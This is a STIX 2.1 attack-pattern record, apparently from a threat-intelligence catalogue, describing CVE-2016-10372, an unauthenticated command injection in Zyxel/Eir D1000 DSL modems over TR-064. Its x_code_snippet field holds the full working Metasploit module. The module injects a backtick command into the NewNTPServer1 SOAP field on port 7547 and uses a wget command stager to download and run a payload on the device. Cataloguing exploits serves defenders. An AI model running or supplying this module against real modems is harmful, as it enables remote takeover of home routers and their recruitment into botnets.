{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--611573d6-0d3f-428f-bdf9-6ac113d1fdca",
    "created": "2024-08-14T17:00:06.925634Z",
    "modified": "2024-08-14T17:00:06.925638Z",
    "name": "Zyxel/Eir D1000 DSL Modem NewNTPServer Command Injection Over TR-064",
    "description": " Broadband DSL modems manufactured by Zyxel and distributed by some European ISPs are vulnerable to a command injection vulnerability when setting the 'NewNTPServer' value using the TR-64 SOAP-based configuration protocol. In the tested case, no authentication is required to set this value on affected DSL modems.  This exploit was originally tested on firmware versions up to 2.00(AADU.5)_20150909. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/tr064_ntpserver_cmdinject.rb",
            "external_id": "tr064_ntpserver_cmdinject.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-10372"
        },
        {
            "source_name": "reference",
            "url": "https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/"
        },
        {
            "source_name": "reference",
            "url": "https://isc.sans.edu/forums/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759"
        },
        {
            "source_name": "reference",
            "url": "https://broadband-forum.org/technical/download/TR-064.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Zyxel/Eir D1000 DSL Modem NewNTPServer Command Injection Over TR-064',\n      'Description' => %q{\n        Broadband DSL modems manufactured by Zyxel and distributed by some\n        European ISPs are vulnerable to a command injection vulnerability when setting\n        the 'NewNTPServer' value using the TR-64 SOAP-based configuration protocol. In\n        the tested case, no authentication is required to set this value on affected\n        DSL modems.\n\n        This exploit was originally tested on firmware versions up to 2.00(AADU.5)_20150909.\n      },\n      'Author'      =>\n        [\n          'Kenzo', # Vulnerability discovery and original Metasploit module\n          'Michael Messner <devnull[at]s3cur1ty.de>', # Copypasta from TheMoon msf module, payload help\n          'todb',  # Metasploit module\n          'wvu' ,  # Metasploit module\n          '0x27'   # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2016-10372' ],\n          [ 'EDB', '40740' ],\n          [ 'URL', 'https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/'],\n          [ 'URL', 'https://isc.sans.edu/forums/diary/Port+7547+SOAP+Remote+Code+Execution+Attack+Against+DSL+Modems/21759'],\n          [ 'URL', 'https://broadband-forum.org/technical/download/TR-064.pdf']\n        ],\n      'DisclosureDate' => '2016-11-07',\n      'Privileged'     => true,\n      'Targets' =>\n        [\n          [ 'MIPS Big Endian',\n            {\n              'Platform' => 'linux',\n              'Arch'     => ARCH_MIPSBE\n            }\n          ],\n          [ 'MIPS Little Endian',\n            {\n              'Platform' => 'linux',\n              'Arch'     => ARCH_MIPSLE\n            }\n          ],\n\n        ],\n      'DefaultTarget'    => 0,\n      'DefaultOptions' => {'WfsDelay' => 10}\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(7547), # TR-064 CWMP port for SOAP/XML commands\n        OptBool::new('FORCE_EXPLOIT', [false, 'Force an attempt even if the check fails', nil])\n      ])\n\n  end\n\n  def set_new_ntp_server(cmd)\n    template = \"<?xml version=\\\"1.0\\\"?>\"\n    template << \"<SOAP-ENV:Envelope xmlns:SOAP-ENV=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" SOAP-ENV:encodingStyle=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\">\"\n    template << \" <SOAP-ENV:Body>\"\n    template << \"  <u:SetNTPServers xmlns:u=\\\"urn:dslforum-org:service:Time:1\\\">\"\n    template << \"   <NewNTPServer1>`%s`</NewNTPServer1>\" # Backticks, aw yeah\n    template << \"   <NewNTPServer2></NewNTPServer2>\"\n    template << \"   <NewNTPServer3></NewNTPServer3>\"\n    template << \"   <NewNTPServer4></NewNTPServer4>\"\n    template << \"   <NewNTPServer5></NewNTPServer5>\"\n    template << \"  </u:SetNTPServers>\"\n    template << \" </SOAP-ENV:Body>\"\n    template << \"</SOAP-ENV:Envelope>\"\n\n    template % cmd\n  end\n\n  def execute_command(cmd, opts)\n    uri = '/UD/act?1'\n    soapaction = \"urn:dslforum-org:service:Time:1#SetNTPServers\"\n    injected_data = set_new_ntp_server(cmd)\n    begin\n      res = send_request_cgi({\n        'uri'    => uri,\n        'ctype' => \"text/xml\",\n        'method' => 'POST',\n        'headers' => {\n          'SOAPAction' => soapaction,\n          },\n        'data' => injected_data\n      }, 2)\n      return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => '/globe'\n      })\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{peer} - A connection error has occurred\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res and res.code == 404 and res.body =~ /home_wan\\.htm/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def inject_staged_data\n    execute_cmdstager(flavor: :wget, linemax: 65, delay: 3)\n  end\n\n  def exploit\n    print_status(\"#{peer} - Checking...\")\n\n    if check == Exploit::CheckCode::Appears\n      print_status(\"#{peer} - Appears vulnerable\")\n      inject_staged_data\n    elsif datastore['FORCE_EXPLOIT']\n      print_status(\"#{peer} - Doesn't appear vulnerable, but trying anyway.\")\n      inject_staged_data\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to access the device\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-11-07",
    "x_mitre_platforms": [
        "linux'"
    ]
}